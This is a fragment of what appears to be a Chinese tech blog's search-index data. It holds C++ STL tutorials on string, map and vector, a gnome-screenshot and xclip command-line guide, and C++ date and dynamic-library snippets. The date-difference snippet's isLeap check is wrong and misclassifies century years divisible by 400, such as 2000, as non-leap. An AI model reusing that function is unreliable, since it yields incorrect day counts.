3); cout &lt;&lt; "str11 = " &lt;&lt; str11 &lt;&lt; endl; // 字符串的区间插入 string str12 = "abcdef"; str12.insert(2, "123"); cout &lt;&lt; "str12 = " &lt;&lt; str12 &lt;&lt; endl; // 字符串的区间删除 string str13 = "123456"; str13.erase(2, 2); cout &lt;&lt; "str13 = " &lt;&lt; str13 &lt;&lt; endl; // 从字符串取得 char * string str14 = "hijkl"; const char *p1 = str14.c_str(); cout &lt;&lt; "p1 = " &lt;&lt; p1 &lt;&lt; endl; // char * 隐式类型转换为 string char *p2 = "abc123"; string str15 = p2; cout &lt;&lt; "str15 = " &lt;&lt; str15 &lt;&lt; endl; // 将 string 拷贝到 char* 指向的内存空间 char *p3 = new char[3]; string str16 = "hello jim"; int number = str16.copy(p3, 3, 2); cout &lt;&lt; "number = " &lt;&lt; number &lt;&lt; endl; cout &lt;&lt; "p3 = " &lt;&lt; p3 &lt;&lt; endl; delete[] p3; return 0;} 程序运行输出的结果如下： 123456789101112131415a b c d e str2 = hello world str3 = world whereindex1 = 3index2 = 14str5 = abcdefstr6 = 654321result = -32str11 = 24astr12 = ab123cdefstr13 = 1256p1 = hijklstr15 = abc123number = 3p3 = llo map 容器map 容器的概念map 是 STL 的一个关联式容器，它提供一对一（其中第一个称为关键字，每个关键字只能在 map 中出现一次，第二个称为该关键字的值）的数据处理能力。map 容器存储的都是 pair 对象，也就是用 pair 类模板创建的键值对。其中，各个键值对的键和值可以是任意数据类型，包括 C++ 基本数据类型（int、double 等）、使用结构体或类自定义的类型。通常情况下，map 容器中存储的各个键值对都选用 string 字符串作为键的类型。map 内部自建了一颗红黑树 (一种非严格意义上的平衡二叉树)，这颗树具有对数据自动排序的功能，所以在 map 内部所有的数据都是有序的。map 的特点是增加和删除节点对迭代器的影响很小，除了那个被操作的节点，对其他的节点都没有什么影响。值得一提的是，使用 map 容器存储的各个键值对，键的值既不能重复也不能被修改。map 可以根据 key 值快速查找记录，复杂度在 log(n) 级别，如果有 1000 条记录，最多查找 10 次，如果有 1000000 条记录，最多查找 20 次。 map 容器的常用操作12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;#include &lt;map&gt;using namespace std;int main() { // 定义Map集合变量 map&lt;int, int&gt; m; // 第一种数据插入方式 m.insert(pair&lt;int, int&gt;(1, 2)); // 第二种数据插入方式（推荐） m.insert(make_pair(3, 4)); // 第三种数据插入方式 m.insert(map&lt;int, int&gt;::value_type(5, 6)); // 第四种数据插入方式 m[7] = 8; // 第一种方式遍历Map集合 for (map&lt;int, int&gt;::iterator it = m.begin(); it != m.end(); it++) { cout &lt;&lt; "key = " &lt;&lt; it-&gt;first &lt;&lt; " , " &lt;&lt; it-&gt;second &lt;&lt; endl; } cout &lt;&lt; endl; // 第二种方式遍历Map集合 for (auto it = m.begin(); it != m.end(); it++) { cout &lt;&lt; "key = " &lt;&lt; it-&gt;first &lt;&lt; " , value = " &lt;&lt; it-&gt;second &lt;&lt; endl; } cout &lt;&lt; endl; // 获取指定的Key map&lt;int, int&gt;::iterator item = m.find(5); cout &lt;&lt; "key = " &lt;&lt; item-&gt;first &lt;&lt; " , value = " &lt;&lt; item-&gt;second &lt;&lt; endl; cout &lt;&lt; endl; // 第一种方式判断Key是否存在 // 如果Key存在，find()函数会返回Key对应的迭代器，如果Key不存在，find()函数会返回尾后迭代器end() if (m.find(100) == m.end()) { cout &lt;&lt; "key " &lt;&lt; 100 &lt;&lt; " not exist" &lt;&lt; endl; } cout &lt;&lt; endl; // 第二种方式判断Key是否存在 // count()函数用于统计Key值在Map中出现的次数，Map的Key是不允许重复的，因此如果Key存在会返回1，不存在会返回0 if (m.count(5) == 1) { cout &lt;&lt; "key " &lt;&lt; 5 &lt;&lt; " existed" &lt;&lt; endl; } cout &lt;&lt; endl; // 删除指定的Key m.erase(7); for (auto it = m.begin(); it != m.end(); it++) { cout &lt;&lt; "key = " &lt;&lt; it-&gt;first &lt;&lt; " , value = " &lt;&lt; it-&gt;second &lt;&lt; endl; }} 程序运行输出的结果如下： 12345678910111213141516171819key = 1 , 2key = 3 , 4key = 5 , 6key = 7 , 8key = 1 , value = 2key = 3 , value = 4key = 5 , value = 6key = 7 , value = 8key = 5 , value = 6key 100 not existkey 5 existedkey = 1 , value = 2key = 3 , value = 4key = 5 , value = 6 参考资料 C++ 中 string 成员函数 length ()、size () 与 strlen () 的区别 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"C++ 进阶基础之五",url:"/posts/64fd9f88.html",text:'大纲 C++ 进阶基础之一、C++ 进阶基础之二、C++ 进阶基础之三 C++ 进阶基础之四、C++ 进阶基础之五、C++ 进阶基础之六 C++ 进阶基础之七、C++ 进阶基础之八 基本概念模板的基本概念模板是实现代码重用机制的一种重要工具，其本质是类型参数化，即把类型定义为参数。C++ 提供了类模板和函数模板，详细的使用可参考教程：C++ 进阶基础之二 类模板的简介 类模板的本质就是建立一个通用类，其成员变量的类型、成员函数的返回类型和参数类型都可以不具体指定，而用虚拟的类型来替代 当使用类模板建立对象时，编译器会根据实参的类型取代类模板中的虚拟类型，从而实现不同类的功能 函数模板的简介 函数模板就是建立一个通用的函数，其函数返回类型和形参类型不具体指定，而是用虚拟的类型来替代 凡是函数体相同的函数都可以用函数模板来代替，不必定义多个函数，只需在模板中定义一次即可 在调用函数时，编译器会根据实参的类型来取代模板中的虚拟类型，从而实现不同函数的功能 STL 的基本概念STL 的简介STL（Standard Template Library，标准模板库）是惠普实验室开发的一系列软件的统称。现然主要出现在 C++ 中，但在被引入 C++ 之前该技术就已经存在了很长的一段时间。STL 的从广义上讲分为三类：Algorithm（算法）、Container（容器）和 Iterator（迭代器），容器和算法通过迭代器可以进行无缝地连接。几乎所有的 STL 代码都采用了类模板和函数模板的方式编写，这相比于传统的由类和函数组成的库来说提供了更好的代码重用机会。从逻辑层次来看，在 STL 中体现了泛型化程序设计的思想（Generic Programming），在这种思想里，大部分的基本算法被抽象和被泛化，独立于与之对应的数据结构，用于以相同或相近的方式处理各种不同情形。从实现层次看，整个 STL 是以一种类型参数化（Type Parameterized）的方式实现的，本质是基于模板（Template）。在 C++ 标准中，STL 被组织为下面的 13 个头文件：&lt;algorithm&gt;、&lt;deque&gt;、&lt;functional&gt;、&lt;iterator&gt;、&lt;vector&gt;、&lt;list&gt;、&lt;map&gt;、&lt;memory&gt;、&lt;numeric&gt;、&lt;queue&gt;、&lt;set&gt;、&lt;stack&gt; 、&lt;utility&gt;。 STL 的优势 STL 是 C++ 的一部分，因此不用额外安装什么就可以直接使用，因为它被内建在编译器之内 STL 的一个重要特点是数据结构和算法的分离，尽管这是个简单的概念，但是这种分离使 STL 变得非常通用 开发人员一般可以不用思考 STL 具体的实现过程，只要能够熟练使用 STL 就可以了，这样可以把精力放在程序开发的其他方面 STL 具有高可重用性、高性能、高移植性、跨平台的优点 高移植性：如在项目 A 上使用 STL 编写的模块，可以直接移植到项目 B 上 跨平台：如用 Windows 的 Visual Studio 编写的代码，可以在 Mac OS 的 XCode 上直接编译 高性能：如 map 可以高效地从十万条记录里面查找出指定的记录，因为 map 是采用红黑树的变体实现的（红黑树是平横二叉树的一种） 高可重用性：STL 中几乎所有的代码都采用了类模板和函数模板的方式实现，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会 STL 的六大组件 容器（Containers）：各种数据结构，如 vector、list、deque、set、map 用来存放数据，STL 容器是一种类模板。 算法（Algorithms）：各种常用算法如 sort、search、copy、erase，从实现的角度来看，STL 算法是一种函数模板。 迭代器（Iterators）：扮演容器与算法之间的胶合剂，是所谓的 泛型指针，共有五种类型，以及其它衍生变体。从实现的角度来看，迭代器是一种将 Operators*、Operator-&gt;、Operator++、Operator-- 等相关操作予以重载的类模板。所有 STL 容器都附带有自己专属的迭代器，原生指针（Native pointer）也是一种迭代器。 仿函数（Functors）： 行为类似函数，可作为算法的某种策略（Policy），从实现的角度来看，仿函数是一种重载了 Operator() 的类或者类模板。一般函数指针可视为狭义的仿函数。 适配器（Adapters）：一种用来修饰容器（Containers）或仿函数（Functors）或迭代器（Iterators）接口的东西，例如：STL 提供的 Queue 和 Stack，虽然看似容器，但只能算是一种容器适配器，因为它们的底层完全借助 Deque，所有操作都由底层的 Deque 提供。改变 Functor 接口者，称为 Function Adapter；改变 Container 接口者，称为 Container Adapter；改变 Iterator 接口者，称为 Iterator Adapter。适配器的实现技术很难一言蔽之，必须逐一分析。 空间配置器（Allocators）：负责空间配置与管理，从实现的角度来看，配置器是一个实现了动态空间配置、空间管理、空间释放的类模板。 容器的基本概念在实际的开发过程中，数据结构本身的重要性不会逊于操作数据结构的算法的重要性，当程序中存在着对执行效率要求很高的部分时，数据结构的选择就显得更加重要。经典的数据结构数量有限，但是常常重复着一些为了实现向量、链表等结构而编写的代码，这些代码都十分相似，只是为了适应不同数据的变化而在细节上有所不同。STL 容器为此提供了这样的方便，它允许重复利用已有的实现构造自己的特定类型下的数据结构，通过设置一些模板，STL 容器对最常用的数据结构提供了支持，这些模板的参数允许指定容器中元素的数据类型，可以将许多重复而乏味的工作简化。容器部分主要由头文件 &lt;vector&gt;、&lt;list&gt;、&lt;deque&gt;、&lt;set&gt;、&lt;map&gt;、&lt;stack&gt;、&lt;queue&gt; 组成。对于常用的一些容器和容器适配器（可以看作由其它容器实现的容器），可以通过下表总结不同容器与相应头文件的对应关系。 容器 描述 实现头文件 向量 (vector) 连续内存的元素 &lt;vector&gt; 列表 (list) 由节点组成的双向链表，每个结点包含着一个元素 &lt;list&gt; 双队列 (deque) 连续内存的指向不同元素的指针所组成的数组 &lt;deque&gt; 集合 (set) 由节点组成的红黑树，每个节点都包含着一个元素，节点之间以某种作用于元素对的谓词排列，没有两个不同的元素能够拥有相同的次序 &lt;set&gt; 多重集合 (multiset) 允许存在两个次序相等的元素的集合 &lt;set&gt; 栈 (stack) 先进后出的值的排列 &lt;stack&gt; 队列 (queue) 先进先出的执的排列 &lt;queue&gt; 优先队列 (priority_queue) 元素的次序是由作用于所内存的值对上的某种谓词决定的一种队列 &lt;queue&gt; 映射 (map) 由 {键，值} 对组成的集合，以某种作用于键对上的谓词排列 &lt;map&gt; 多重映射 (multimap) 允许键对有相等的次序的映射 &lt;map&gt; 容器的简介容器可以用来管理一组元素，如下图所示： 容器的分类 序列式容器（Sequence Containers）：每个元素都有固定的位置，取决于插入时机和地点，与元素的值无关，如 vector、deque、list 关联式容器（Associated Containers）：元素位置取决于特定的排序规则，与插入的顺序无关，如 set、multiset、map、multimap 算法的基本概念算法的简介函数库对数据类型的选择对其可重用性起着至关重要的作用。举例来说，一个求方根的函数，在使用浮点数作为其参数类型的情况下的可重用性肯定比使用整型作为它的参数类性要高。而 C++ 通过模板的机制允许推迟对某些类型的选择，直到真正想使用模板或者说对模板进行特化的时候，STL 就利用了这一点提供了相当多的算法。它是在一个有效的框架中完成这些算法的 —— 可以将所有的类型划分为少数的几类，然后就可以在模板的参数中使用一种类型替换掉同一种类中的其他类型。 算法的头文件STL 提供了大约 100 个实现算法的函数模板，比如算法 for_each 将为指定序列中的每一个元素调用指定的函数，stable_sort 以调用者所指定的规则对序列进行稳定性排序等等。这样一来，只要熟悉了 STL 之后，许多代码可以被大大地简化，只需要通过调用一两个算法模板，就可以完成所需要的功能。算法主要由头文件 &lt;algorithm&gt;、&lt;numeric&gt;、&lt;functional&gt; 组成。&lt;algorithm&gt; 是所有 STL 头文件中最大的一个，它是由一大堆函数模板组成的，可以认为每个函数在很大程度上都是独立的，其中常用到的功能范围涉及到比较、交换、查找、遍历、复制、修改、移除、反转、排序、合并操作等。&lt;numeric&gt; 的体积很小，只包括几个在序列上面进行简单数学运算的函数模板，包括加法和乘法在序列上的一些操作。&lt;functional&gt; 中则定义了一些类模板，用来声明函数对象。 迭代器的基本概念迭代器从作用上来说是最基本的部分。软件设计有一个基本原则，所有的问题都可以通过引进一个间接层来简化，这种简化在 STL 中就是用迭代器来完成的。概括来说，迭代器在 STL 中用来将算法和容器联系起来，起着一种黏和剂的作用。几乎 STL 提供的所有算法都是通过迭代器存取元素序列进行工作的，每一个容器都定义了其本身所专有的迭代器，用以存取容器中的元素。迭代器主要由头文件 &lt;utility&gt;、&lt;iterator&gt;、&lt;memory&gt; 组成。其中 &lt;utility&gt; 是一个很小的头文件，它包括了贯穿使用在 STL 中的几个模板的声明，&lt;iterator&gt; 中提供了迭代器 使用的许多方法，而对于 &lt;memory&gt; 描述起来则十分的困难，它以不同寻常的方式为容器中的元素分配内存空间，同时也为某些算法在执行期间产生的临时对象提供管理机制，&lt;memory&gt; 中最主要的是类模板 allocator，它负责产生所有容器的默认空间配置器（分配器）。 初识容器的使用指针是一种迭代器1234567891011121314#include &lt;iostream&gt;using namespace std;int main() { int array[5] = {1, 2, 3, 4, 5}; int length = sizeof(array) / sizeof(int); int *p = array; for (int i = 0; i &lt; length; i++) { cout &lt;&lt; *(p++) &lt;&lt; " "; } return 0;} 程序运行输出的结果如下： 11 2 3 4 5 容器存放基础数据类型12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;void m_print(const int num) { cout &lt;&lt; num &lt;&lt; " ";}int main() { // 定义容器 vector&lt;int&gt; v; // 插入数据 v.push_back(11); v.push_back(12); v.push_back(13); v.push_back(14); v.push_back(15); // 第一种方式：遍历容器 vector&lt;int&gt;::iterator itBegin = v.begin(); vector&lt;int&gt;::iterator itEnd = v.end(); while (itBegin != itEnd) { cout &lt;&lt; *(itBegin++) &lt;&lt; " "; } cout &lt;&lt; endl; // 第二种方式：遍历容器 for (vector&lt;int&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl; // 第三种方式：遍历容器 for_each(v.begin(), v.end(), m_print); return 0;} 程序运行输出的结果如下： 12311 12 13 14 15 11 12 13 14 15 11 12 13 14 15 容器存放自定义数据类型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;class Person {public: Person(int age, string name) { this-&gt;age = age; this-&gt;name = name; } int getAge() { return this-&gt;age; } string getName() { return this-&gt;name; }private: int age; string name;};int main() { Person p1(23, "Jim"); Person p2(26, "Tom"); Person p3(29, "Peter"); // 定义容器 vector&lt;Person&gt; v; // 插入数据 v.push_back(p1); v.push_back(p2); v.push_back(p3); // 遍历容器 for (vector&lt;Person&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; "age = " &lt;&lt; it-&gt;getAge() &lt;&lt; ", name = " &lt;&lt; it-&gt;getName() &lt;&lt; endl; // 或者 // cout &lt;&lt; "age = " &lt;&lt; (*it).getAge() &lt;&lt; ", name = " &lt;&lt; (*it).getName() &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 123age = 23, name = Jimage = 26, name = Tomage = 29, name = Peter 容器存放自定义数据类型的指针1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;class Person {public: Person(int age, string name) { this-&gt;age = age; this-&gt;name = name; } int getAge() { return this-&gt;age; } string getName() { return this-&gt;name; }private: int age; string name;};int main() { // 定义容器 vector&lt;Person *&gt; v; // 插入数据 v.push_back(new Person(23, "Jim")); v.push_back(new Person(26, "Tom")); v.push_back(new Person(29, "Peter")); // 遍历容器 for (vector&lt;Person *&gt;::iterator it = v.begin(); it != v.end(); it++) { cout &lt;&lt; "age = " &lt;&lt; (*it)-&gt;getAge() &lt;&lt; ", name = " &lt;&lt; (*it)-&gt;getName() &lt;&lt; endl; // 或者 // cout &lt;&lt; "age = " &lt;&lt; (**it).getAge() &lt;&lt; ", name = " &lt;&lt; (**it).getName() &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 123age = 23, name = Jimage = 26, name = Tomage = 29, name = Peter 容器之间的嵌套使用12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main() { // 定义容器 vector&lt;int&gt; v1; vector&lt;int&gt; v2; vector&lt;int&gt; v3; vector&lt;vector&lt;int&gt;&gt; v; // 插入数据 for (int i = 0; i &lt; 5; i++) { v1.push_back(i + 1); v2.push_back(i + 6); v3.push_back(i + 11); } v.push_back(v1); v.push_back(v2); v.push_back(v3); // 遍历容器 for (vector&lt;vector&lt;int&gt;&gt;::iterator it1 = v.begin(); it1 != v.end(); it1++) { for (vector&lt;int&gt;::iterator it2 = (*it1).begin(); it2 != (*it1).end(); it2++) { cout &lt;&lt; *it2 &lt;&lt; " "; } cout &lt;&lt; endl; } return 0;} 程序运行输出的结果如下： 1231 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"Linux 屏幕截图和剪贴板命令行工具",url:"/posts/9eb6789a.html",text:'前言版本说明 xclip：0.13 gnome-screenshot：3.26.0 截图工具gnome-screenshot 是一款 GNOME 命令行工具，它是一款用来对整个屏幕、一个特定的窗口或者用户所定义一些其他区域进行捕获的工具。该工具提供了几个其他的功能，包括对所捕获的截图的边界进行美化的功能。值得一提的是，gnome-screenshot 不适用于 KDE、Xfce 等 Linux 桌面环境。 截图工具的使用1234567891011121314# 捕捉整个屏幕$ gnome-screenshot# 捕捉当前Shell窗口$ gnome-screenshot -w# 捕捉指定区域$ gnome-screenshot -a# 延迟捕捉屏幕$ gnome-screenshot -d 5# 捕捉当前Shell窗口，并去除窗口的边框$ gnome-screenshot -w -b 12345# 区域截图，并将截图复制到剪贴板$ gnome-screenshot -acbp# 区域截图，并将截图输出到指定的文件$ gnome-screenshot -abpf screenshot.png 截图工具的参数说明123456789101112-c, --clipboard 将截图直接发送到剪贴板-w, --window 截取窗口，而不是整个屏幕-a, --area 截取屏幕的一个区域，而不是整个屏幕-b, --include-border 在截图中包含窗口边框-B, --remove-border 去除屏幕截图的窗口边框-p, --include-pointer 在截图中包含鼠标指针-d, --delay=秒 在指定延迟后截图[以秒计]-e, --border-effect=特效 添加到边框的特效（阴影、边框、老照片或无特效）-i, --interactive 交互设置选项-f, --file=文件名 将截图直接保存为该文件--version 打印版本信息并退出--display=显示 要使用的 X 显示 xclip 的安装功能说明xclip 是一个剪贴板的命令行实用工具，它可以从标准文件或文件中读取数据（文本、图片）并将其放置在剪贴板里，也可以将剪贴板里的数据（文本、图片）输出到标准文件或文件中。xclip 详细的功能说明如下，适用于 Debian/Ubuntu/CentOS/Arch 等主流的 Linux 发行版。 Accesses the cut-buffers Prints contents of selection to standard out Waits for selection requests in the background Supports the INCR mechanism for large transfers Reads data piped to standard in or files given as arguments Accesses the XA_PRIMARY, XA_SECONDARY or XA_CLIPBOARD selection Connects to the X display in $DISPLAY, or specified with -display host:0 依赖安装CentOS/Fedora 1# yum install -y libXmu libXmu-devel Debian/Ubuntu 1# apt-get install -y libx11-dev libxmu-headers libxt-dev libxmu-dev 编译安装12345678910111213141516# 克隆代码# git clone https://github.com/astrand/xclip.git# 进入源码目录# cd xclip# 预配置# autoreconf# ./configure# 编译# make# 安装# make install# make install.man 验证安装12345678# 查看版本号$ xclip -versionxclip version 0.13Copyright (C) 2001-2008 Kim Saunders et al.Distributed under the terms of the GNU GPL# 查看命令手册$ man xclip xclip 的使用示例图片的使用示例 将图片复制到剪贴板 12345# 第一步：区域截图，将截图输出到指定的文件$ gnome-screenshot -abpf screenshot.png# 第二步：将指定的图片复制到剪贴板$ xclip -selection clipboard -t image/png -i screenshot.png 将剪贴板的图片输出到指定的文件 12345# 第一步：区域截图，并将截图复制到剪贴板$ gnome-screenshot -acbp# 第二步：将剪贴板的图片输出到指定的文件$ xclip -selection clipboard -t image/png -o &gt; clipboard.png 完整的使用示例12345678910111213141516171819## Copy your uptime into the selection for pasting:$ uptime | xclip## Copy your password file for pasting:$ xclip /etc/passwd## Save some text you have Edit | Copied in a web browser:$ xclip -o -sel clip &gt; webpage.txt## Open a URL selected in an email client$ mozilla `xclip -o`## Copy XA_PRIMARY to XA_CLIPBOARD$ xclip -o | xclip -sel clip## In command mode in vim, select some lines of text, then press shift-:## for an ex prompt, and use this command to copy the selected lines of## text to the primary X selection:$ !xclip -f 值得一提的是，xclip 自身还提供了 xclip-copyfile、xclip-pastefile、xclip-cutfile 命令行工具，支持在不同的目录和机器之间拷贝和移动文件，详见：官方文档 VS Code 使用说明在 Linux 系统下，VS Code 的 MarkDown 粘贴插件，例如 Markdown Paste 底层使用了 xclip，且版本必须大于等于 0.13.0，否则这类插件无法正常将剪贴板里的图片粘贴到 MarkDown 文件里。 参考资料 Copy image from clipboard to file GNOME Screenshot can’t copy to clipboard in Ubuntu 18.04 How to copy image to clipboard, to paste to another application How to copy an image to the clipboard from a file using command line var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"C++ 开发常用代码块之一",url:"/posts/b84a96ac.html",text:'日期处理获取时间戳1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;chrono&gt;using namespace std;// 获取时间戳（秒数）// dateTime: 日期时间字符串，格式：2021-01-08 21:27:00long getTimestamp(const string &amp;dateTime) { tm tm = {}; strptime(dateTime.c_str(), "%Y-%m-%d %H:%M:%S", &amp;tm); chrono::system_clock::time_point tp = chrono::system_clock::from_time_t(mktime(&amp;tm)); long milliseconds = chrono::duration_cast&lt;chrono::milliseconds&gt;(tp.time_since_epoch()).count(); return milliseconds / 1000;}int main() { long timestamp = getTimestamp("2021-01-08 21:27:00"); cout &lt;&lt; "timestamp = " &lt;&lt; timestamp &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 1timestamp = 1610112420 格式化当前时间12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;time.h&gt;using namespace std;// 格式化当前时间// 默认格式是: 2020-06-07 23:46:53string formatCurrentTime() { time_t rawtime; struct tm* info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, "%Y-%m-%d %H:%M:%S", info); string str(buffer); return str;}// 格式化当前时间// format: 格式字符串，例如 %Y-%m-%d %H:%M:%Sstring formatCurrentTime(string format) { time_t rawtime; struct tm* info; char buffer[80]; time(&amp;rawtime); info = localtime(&amp;rawtime); strftime(buffer, 80, format.c_str(), info); string str(buffer); return str;}int main() { cout &lt;&lt; formatCurrentTime() &lt;&lt; endl; cout &lt;&lt; formatCurrentTime("%Y-%m-%d") &lt;&lt; endl;} 程序运行输出的结果如下： 122021-11-22 22:52:432021-11-22 计算指定的日期是星期几12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;sstream&gt;using namespace std;// 根据给定的日期，计算它是星期几// date: 日期字符串，格式是: 2021-12-01// 返回值：1, 2, 3, 4, 5, 6, 0, 其中 0 表示星期日int dayOfWeek(const string &amp;date) { char c; int y, m, d; stringstream(date) &gt;&gt; y &gt;&gt; c &gt;&gt; m &gt;&gt; c &gt;&gt; d; tm t = {0, 0, 0, d, m - 1, y - 1900}; mktime(&amp;t); return t.tm_wday;}// 根据给定的日期，判断是否为周末// date: 日期字符串，格式是: 2021-12-01bool isWeekendDays(const string &amp;date) { int wday = dayOfWeek(date); if (wday == 6 || wday == 0) { return true; } return false;}int main() { cout &lt;&lt; dayOfWeek("2022-01-07") &lt;&lt; endl; cout &lt;&lt; dayOfWeek("2022-01-08") &lt;&lt; endl; cout &lt;&lt; dayOfWeek("2022-01-09") &lt;&lt; endl; cout &lt;&lt; dayOfWeek("2022-01-10") &lt;&lt; endl; cout &lt;&lt; (isWeekendDays("2022-01-09") ? "true" : "false") &lt;&lt; endl;} 程序运行输出的结果如下： 123455601true 计算两个日期之间的天数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101#include &lt;iostream&gt;using namespace std;// 判断一个年份是否为闰年bool isLeap(int year) { return (year % 4 == 0 || year % 400 == 0) &amp;&amp; (year % 100 != 0);}// 计算特定年份的天数int daysOfYear(int year) { return isLeap(year) ? 366 : 365;}// 根据给定的日期，计算它在该年的第几天int dayOfYear(int year, int month, int day) { int DAY[12] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }; if (isLeap(year)) { DAY[1] = 29; } for (int i = 0; i &lt; month - 1; ++i) { day += DAY[i]; } return day;}// 判断日期字符串是否合法，并分别取出日期中的年月日// date: 日期字符串，格式是: 20211201bool stringToDate(string date, int&amp; year, int&amp; month, int&amp; day) { year = atoi(date.substr(0, 4).c_str()); month = atoi(date.substr(4, 2).c_str()); day = atoi(date.substr(6, 2).c_str()); int DAY[12] = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }; if (isLeap(year)) { DAY[1] = 29; } return year &gt;= 0 &amp;&amp; month &lt;= 12 &amp;&amp; month &gt; 0 &amp;&amp; day &lt;= DAY[month - 1] &amp;&amp; day &gt; 0;}// 计算两个日期之间的天数// date1: 日期字符串，格式是: 20211201// date2: 日期字符串，格式是: 20211201// 当返回值为 -1 时，说明日期的格式不正确int daysBetween2Date(string date1, string date2) { int year1, month1, day1; int year2, month2, day2; if (!stringToDate(date1, year1, month1, day1) || !stringToDate(date2, year2, month2, day2)) { cout &lt;&lt; "输入的日期格式不正确"; return -1; } if (year1 == year2 &amp;&amp; month1 == month2) { return day1 &gt; day2 ? day1 - day2 : day2 - day1; } else if (year1 == year2) { int d1, d2; d1 = dayOfYear(year1, month1, day1); d2 = dayOfYear(year2, month2, day2); return d1 &gt; d2 ? d1 - d2 : d2 - d1; } else { // 确保year1年份比year2早 if (year1 &gt; year2) { swap(year1, year2); swap(month1, month2); swap(day1, day2); } // 计算第一个日期在该年还剩多少天 int d1, d2, d3; if (isLeap(year1)) { d1 = 366 - dayOfYear(year1, month1, day1); } else { d1 = 365 - dayOfYear(year1, month1, day1); } // 计算第二日期在当年中的第几天 d2 = dayOfYear(year2, month2, day2); // 计算两个年份相隔的天数 d3 = 0; for (int year = year1 + 1; year &lt; year2; year++) { if (isLeap(year)) d3 += 366; else d3 += 365; } return d1 + d2 + d3; }}int main() { int days = daysBetween2Date("20101111", "20111111"); cout &lt;&lt; "相差 " &lt;&lt; days &lt;&lt; " 天" &lt;&lt; endl; int days2 = daysBetween2Date("20200202", "20200131"); cout &lt;&lt; "相差 " &lt;&lt; days2 &lt;&lt; " 天" &lt;&lt; endl; int days3 = daysBetween2Date("20230712", "20050619"); cout &lt;&lt; "相差 " &lt;&lt; days3 &lt;&lt; " 天" &lt;&lt; endl; return 0;} 程序运行输出的结果如下： 123相差 365 天相差 2 天相差 6597 天 加载动态库加载动态库（.so）提示 下述示例代码，适用于 Linux 系统的 C++ 开发。 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;dlfcn.h&gt;#include &lt;stdlib.h&gt;#include &lt;iostream&gt;using namespace std;int main(){ int a = 0; // 加载动态库 void *handle = dlopen("./libadd_c.so", RTLD_LAZY); if(!handle) { printf("open lib error\\n"); cout&lt;&lt;dlerror()&lt;&lt;endl; return -1; } // 定义函数指针类型 typedef int (*add_t)(int a, int b); // 调用动态库 add_t add = (add_t) dlsym(handle, "add"); if(!add) { cout&lt;&lt;dlerror()&lt;&lt;endl; dlclose(handle); return -1; } a = add(3, 4); printf("a = %d\\n",a); // 释放动态库 dlclose(handle); return 0;} 加载动态链接库（.dll）提示 下述示例代码，适用于 Windows 系统的 C++ 开发。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;windows.h&gt;using namespace std;int main() { HINSTANCE hInstance; // 加载动态链接库 hInstance = LoadLibrary("./socketclient.dll"); if (hInstance == NULL) { printf("LoadLibrary() 调用失败, ErrorCode: %d", GetLastError()); return -1; } // 定义函数类型指针 typedef int (*CltSocketInit)(void** handle); // 调用动态链接库 CltSocketInit cltSocketInit = (CltSocketInit)GetProcAddress(hInstance, "cltSocketInit"); if 